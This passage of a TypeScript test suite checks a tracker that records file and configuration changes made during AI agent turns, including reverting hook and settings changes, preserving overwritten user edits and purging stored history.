      await fs.mkdir(join(sub.base, 'repo', '.git'), { recursive: true });
      await fs.writeFile(join(sub.base, 'repo', '.git', 'HEAD'), 'ref: refs/heads/main\n');
      const tracker = sub.tracker();
      await openWorkspace(tracker, sub);
      const turn = new Turn(tracker, sub);
      await turn.begin();
      await turn.command(async () => {
        await fs.mkdir(join(sub.base, 'repo', '.husky'), { recursive: true });
        await fs.writeFile(join(sub.base, 'repo', '.husky', 'pre-commit'), 'evil\n');
      });
      await turn.end();
      expect(tracker.configChanges(sub.folder.key).map((c) => c.displayPath)).toEqual([
        '.husky/pre-commit',
      ]);
    } finally {
      await sub.cleanup();
    }
  });

  it('c. a revert of a file in a new subdirectory deletes the file', async () => {
    const { tracker, turn } = await setup();
    await turn.command(() => env.write({ '.claude/skills/x/SKILL.md': 'new' }));
    await turn.end();
    const [change] = tracker.configChanges(env.folder.key);
    await tracker.resolveConfigChange(env.folder.key, change!.id, 'revert');
    await expect(fs.access(env.abs('.claude/skills/x/SKILL.md'))).rejects.toThrow();
  });

  it('c. at most 500 files are taken from the watched directories in a listing', async () => {
    for (let i = 0; i < MAX_WATCHED_TREE_FILES + 100; i += 1) {
      await env.write({ [`.claude/skills/s${i % 7}/f${i}.md`]: 'x' });
    }
    const watched = await listWatched(env.root, undefined);
    const fromTree = watched.filter((w) => w.rel.startsWith('.claude/skills/'));
    expect(fromTree).toHaveLength(MAX_WATCHED_TREE_FILES);
  });

  it('a hook directory with only samples changes nothing', async () => {
    const { tracker, turn } = await setup({}, true);
    await turn.command(() => env.write({ '.git/hooks/pre-commit.sample': 'x' }));
    await turn.end();
    expect(tracker.configChanges(env.folder.key)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------------------------
describe('9. preserved versions', () => {
  async function preservedTexts(
    ws: Parameters<typeof operations>[0],
    op: OperationRecord,
  ): Promise<Record<string, string[]>> {
    const out: Record<string, string[]> = {};
    for (const { path, state } of op.preserved) {
      (out[path] ??= []).push(await textOf(ws, state));
    }
    return out;
  }

  it('a saved version that a command then overwrites is preserved and retrievable', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R original' });
    await turn.userSave('a.ts', 'U saved by the user');
    await turn.shellWrite({ 'a.ts': 'A written by a command' });
    await turn.end();
    const op = operations(ws)[0]!;
    expect(await preservedTexts(ws, op)).toEqual({ 'a.ts': ['U saved by the user'] });
    const hash = hashOf(op.preserved[0]!.state)!;
    expect(hash).toBe(sha('U saved by the user'));
    expect(op.preserved[0]!.state).toMatchObject({ kind: 'file', stored: true });
    expect(await ws.blobs.has(hash)).toBe(true);
    // The change itself runs from B to the command's file.
    expect(await textOf(ws, changeOf(op, 'a.ts').before)).toBe('R original');
  });

  it('agent writes, the user edits outside the editor, the agent writes again: the edit is preserved', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await turn.edit('a.ts', 'A1 first agent write');
    await env.write({ 'a.ts': 'U user edit in between' });
    await turn.edit('a.ts', 'A2 second agent write');
    await turn.end();
    const op = operations(ws)[0]!;
    expect(await preservedTexts(ws, op)).toEqual({ 'a.ts': ['U user edit in between'] });
    const change = changeOf(op, 'a.ts');
    expect(await textOf(ws, change.before)).toBe('R');
    expect(await textOf(ws, change.after)).toBe('A2 second agent write');
    expect(change.attribution).toBe('mixed');
  });

  it('the same after a command wrote first', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await turn.shellWrite({ 'a.ts': 'A1 by a command' });
    await env.write({ 'a.ts': 'U user edit in between' });
    await turn.edit('a.ts', 'A2 by a tool');
    await turn.end();
    expect(await preservedTexts(ws, operations(ws)[0]!)).toEqual({
      'a.ts': ['U user edit in between'],
    });
  });

  it('a version that is already the before-state of a change is not repeated', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await turn.userSave('a.ts', 'U saved');
    await turn.edit('a.ts', 'A overwrites');
    await turn.end();
    const records = recordsOf(ws);
    expect(records.map((r) => r.type)).toEqual(['foreign-delta', 'operation']);
    const op = records[1] as OperationRecord;
    expect(await textOf(ws, changeOf(op, 'a.ts').before)).toBe('U saved');
    expect(op.preserved).toEqual([]);
  });

  it('a version that is the final state of the path is not repeated either', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await turn.userSave('a.ts', 'U saved');
    await turn.end();
    const op = operations(ws)[0]!;
    expect(changeOf(op, 'a.ts').attribution).toBe('user');
    expect(op.preserved).toEqual([]);
  });

  it('several saves: the ones no change holds are preserved once each', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await turn.userSave('a.ts', 'U1 first save');
    await turn.userSave('a.ts', 'U2 second save');
    await turn.userSave('a.ts', 'U2 second save'); // the same content again
    await turn.end();
    const op = operations(ws)[0]!;
    expect(await textOf(ws, changeOf(op, 'a.ts').after)).toBe('U2 second save');
    expect(await preservedTexts(ws, op)).toEqual({ 'a.ts': ['U1 first save'] });
  });

  it('with no change at all no operation is written for the preserved versions', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await turn.userSave('a.ts', 'U passing version');
    await turn.userSave('a.ts', 'R'); // back to what it was
    await turn.end();
    expect(operations(ws)).toEqual([]);
    expect(recordsOf(ws)).toEqual([]);
  });

  it('a denied request does not make its capture a user version', async () => {
    const { ws, turn } = await started({ 'a.ts': 'R' });
    await env.write({ 'a.ts': 'U hand edit' });
    await turn.fileTool('Edit', env.abs('a.ts'), () => Promise.resolve(), { outcome: 'denied' });
    await turn.shellWrite({ 'a.ts': 'A by a command' });
    await turn.end();
    expect(operations(ws)[0]!.preserved).toEqual([]);
  });

  it('recovery records keep preserved empty', async () => {
    await env.write({ 'a.ts': 'v0' });
    const first = env.tracker();
    const turn = new Turn(first, env);
    await turn.begin();
    await turn.userSave('a.ts', 'U');
    await first.dispose();
    const second = env.tracker({ isProcessAlive: () => false });
    await second.recover(env.folder, env.settings);
    const op = operations(second.folder(env.folder.key)!)[0]!;
    expect(op.kind).toBe('recovery');
    expect(op.preserved).toEqual([]);
  });
});

// ---------------------------------------------------------------------------------------------
describe('10. configBlobHashes', () => {
  const settingsFile = '.claude/settings.local.json';

  /** Everything else a collection would keep: stored index copies and log references. */
  function otherRoots(ws: Parameters<typeof operations>[0]): Set<string> {
    const roots = new Set<string>();
    for (const entry of ws.index().values()) if (entry.stored && entry.hash) roots.add(entry.hash);
    for (const record of ws.log.records()) {
      if (record.type === 'review') continue;
      for (const change of record.changes) {
        for (const state of [change.before, change.after]) {
          if (state.kind === 'file' && state.hash) roots.add(state.hash);
        }
      }
    }
    return roots;
  }

  /** A gitignored settings file, a synced folder and a turn that has just begun. */
  async function openTurn() {
    await env.write({
      '.gitignore': `${settingsFile}\n`,
      [settingsFile]: '{"before":true}',
      'a.ts': 'a',
    });
    const tracker = env.tracker();
    const ws = await openWorkspace(tracker, env);
    await ws.sync(env.settings);
    const turn = new Turn(tracker, env);
    await turn.begin();
    return { tracker, ws, turn };
  }

  async function changeSettings(turn: Turn): Promise<void> {
    await turn.command(() => env.write({ [settingsFile]: '{"after":true}' }));
    await turn.end();
  }

  it('lists the before and after copies of a pending change, and a collection that keeps them leaves Revert working', async () => {
    const { tracker, ws, turn } = await openTurn();
    await changeSettings(turn);
    const hashes = await tracker.configBlobHashes(env.folder.key);
    expect(hashes).toContain(sha('{"before":true}'));
    expect(hashes).toContain(sha('{"after":true}'));

    const roots = otherRoots(ws);
    for (const hash of hashes) roots.add(hash);
    await collectGarbage(ws.blobs, roots);

    const [change] = tracker.configChanges(env.folder.key);
    expect(await tracker.configChangeTexts(env.folder.key, change!.id)).toEqual({
      before: '{"before":true}',
      after: '{"after":true}',
    });
    await tracker.resolveConfigChange(env.folder.key, change!.id, 'revert');
    expect(await env.read(settingsFile)).toBe('{"before":true}');
  });

  it('without them in the root set the before copy is collected, so the list matters', async () => {
    const { ws, turn } = await openTurn();
    await changeSettings(turn);
    await collectGarbage(ws.blobs, otherRoots(ws));
    expect(await ws.blobs.has(sha('{"before":true}'))).toBe(false);
  });

  it('is empty once the change is resolved', async () => {
    const { tracker, turn } = await openTurn();
    await changeSettings(turn);
    const [change] = tracker.configChanges(env.folder.key);
    await tracker.resolveConfigChange(env.folder.key, change!.id, 'keep');
    expect(await tracker.configBlobHashes(env.folder.key)).toEqual([]);
  });

  it('lists the turn’s snapshot while a turn is open, and nothing afterwards when nothing changed', async () => {
    const { tracker, turn } = await openTurn();
    expect(await tracker.configBlobHashes(env.folder.key)).toEqual([sha('{"before":true}')]);
    await turn.end();
    expect(await tracker.configBlobHashes(env.folder.key)).toEqual([]);
  });

  it('survives a restart through the persisted list, and is empty for an unknown folder', async () => {
    const { tracker, turn } = await openTurn();
    await changeSettings(turn);
    await tracker.dispose();
    const second = env.tracker();
    expect(await second.configBlobHashes(env.folder.key)).toEqual(
      [sha('{"before":true}'), sha('{"after":true}')].sort(),
    );
    expect(await second.configBlobHashes('no-such-folder' as typeof env.folder.key)).toEqual([]);
  });
});

// ---------------------------------------------------------------------------------------------
describe('11. purge', () => {
  /** Reads every file of the workspace folder, for a byte-for-byte comparison. */
  async function snapshotWorkspace(): Promise<Record<string, string>> {
    const out: Record<string, string> = {};
    const walk = async (rel: string): Promise<void> => {
      for (const entry of await fs.readdir(join(env.root, rel), { withFileTypes: true })) {
        const child = rel === '' ? entry.name : `${rel}/${entry.name}`;
        if (entry.isDirectory()) await walk(child);
        else out[child] = (await fs.readFile(env.abs(child))).toString('base64');
      }
    };
    await walk('');
    return out;
  }

  async function populated() {
    await env.write({ 'a.ts': 'a0', '.env': 'SECRET=1\n', 'docs/n.md': 'notes' });
    const tracker = env.tracker();
    const ws = await openWorkspace(tracker, env);
    await ws.sync(env.settings);
    const turn = new Turn(tracker, env);
    await turn.begin();
    await turn.edit('a.ts', 'a1');
    await turn.edit('.env', 'SECRET=2\n');
    await turn.end();
    return { tracker, ws };
  }

  it('leaves no blob, an empty log and an empty index, and the workspace files untouched', async () => {
    const { tracker, ws } = await populated();
    expect((await ws.blobs.list()).length).toBeGreaterThan(0);
    expect(recordsOf(ws).length).toBeGreaterThan(0);
    const before = await snapshotWorkspace();

    await tracker.purge(env.folder.key);

    expect(await ws.blobs.list()).toEqual([]);
    expect(await totalBlobFiles()).toEqual([]);
    expect(recordsOf(ws)).toEqual([]);
    expect(await fs.readFile(join(env.storage, env.folder.key, 'log.jsonl'), 'utf8')).toBe('');
    expect(ws.index().size).toBe(0);
    expect(await loadIndex(join(env.storage, env.folder.key, 'index.json'))).toEqual(new Map());
    expect(ws.busy()).toBe(false);
    expect(await snapshotWorkspace()).toEqual(before);
  });

  async function totalBlobFiles(): Promise<string[]> {
    const dir = join(env.storage, env.folder.key, 'blobs');
    const out: string[] = [];
    for (const shard of await fs.readdir(dir)) {
      for (const name of await fs.readdir(join(dir, shard))) out.push(`${shard}/${name}`);
    }
    return out;
  }

  it('a following turn works and records against a fresh baseline', async () => {
    const { tracker, ws } = await populated();
    await tracker.purge(env.folder.key);

    const turn = new Turn(tracker, env);
    await turn.begin();
    expect(ws.index().get('a.ts')?.hash).toBe(sha('a1'));
    await turn.edit('a.ts', 'a2');
    await turn.end();
    const records = recordsOf(ws);
    expect(records.map((r) => r.type)).toEqual(['operation']);
    const op = records[0] as OperationRecord;
    expect(await textOf(ws, changeOf(op, 'a.ts').before)).toBe('a1');
    expect(await textOf(ws, changeOf(op, 'a.ts').after)).toBe('a2');
  });

  it('prewarm captures the baseline again', async () => {
    const { tracker, ws } = await populated();
    await tracker.purge(env.folder.key);
    tracker.prewarm(env.folder, env.settings);
    await until(() => tracker.status(env.folder.key).state === 'ready');
    expect(ws.index().get('a.ts')?.hash).toBe(sha('a1'));
  });

  it('is refused while a turn is running, and deletes nothing', async () => {
    const { tracker, ws } = await populated();
    const turn = new Turn(tracker, env);
    await turn.begin();
    await expect(tracker.purge(env.folder.key)).rejects.toThrow(
      'An agent turn is running in this folder. Wait for it to finish.',
    );
    expect(PURGE_BUSY_MESSAGE).toBe(
      'An agent turn is running in this folder. Wait for it to finish.',
    );
    expect((await ws.blobs.list()).length).toBeGreaterThan(0);
    expect(recordsOf(ws).length).toBeGreaterThan(0);
    await turn.end();
  });

  it('is refused while a configuration change waits, and deletes nothing', async () => {
    const { tracker, ws } = await populated();
    const turn = new Turn(tracker, env);
    await turn.begin();
    await turn.command(() => env.write({ '.mcp.json': '{}' }));
    await turn.end();
    expect(tracker.configChanges(env.folder.key)).toHaveLength(1);
    await expect(tracker.purge(env.folder.key)).rejects.toThrow(
      'A configuration change is waiting for your decision. Keep or revert it first.',
    );
    expect(PURGE_CONFIG_PENDING_MESSAGE).toBe(
      'A configuration change is waiting for your decision. Keep or revert it first.',
    );
    expect((await ws.blobs.list()).length).toBeGreaterThan(0);
    // Once decided, it goes through.
    const [change] = tracker.configChanges(env.folder.key);
    await tracker.resolveConfigChange(env.folder.key, change!.id, 'keep');
    await tracker.purge(env.folder.key);
    expect(await ws.blobs.list()).toEqual([]);
  });

  it('a second call changes nothing and does not fail', async () => {
    const { tracker, ws } = await populated();
    await tracker.purge(env.folder.key);
    await tracker.purge(env.folder.key);
    expect(await ws.blobs.list()).toEqual([]);
    expect(recordsOf(ws)).toEqual([]);
    expect(ws.index().size).toBe(0);
  });

  it('fires the status event and says the baseline is gone', async () => {
    const { tracker } = await populated();
    expect(tracker.status(env.folder.key).state).toBe('ready');
    const seen: string[] = [];
    tracker.onDidChangeStatus((key) => {
      expect(key).toBe(env.folder.key);
      seen.push(tracker.status(key).state);
    });
    let configEvents = 0;
    tracker.onDidChangeConfigChanges(() => (configEvents += 1));
    await tracker.purge(env.folder.key);
    await sleep(150);
    expect(seen.at(-1)).toBe('idle');
    expect(configEvents).toBe(1);
  });

  it('opens a folder from the previous session that has storage, and ignores one that has none', async () => {
    const { tracker } = await populated();
    await tracker.dispose();
    const second = env.tracker();
    expect(second.folder(env.folder.key)).toBeUndefined();
    await second.purge(env.folder.key);
    const ws = second.folder(env.folder.key)!;
    expect(ws).toBeDefined();
    expect(await ws.blobs.list()).toEqual([]);
    expect(recordsOf(ws)).toEqual([]);

    const third = env.tracker({ storageDir: join(env.base, 'empty-storage') });
    await fs.mkdir(join(env.base, 'empty-storage'));
    await third.purge('never-opened' as typeof env.folder.key);
    expect(await fs.readdir(join(env.base, 'empty-storage'))).toEqual([]);
  });
});
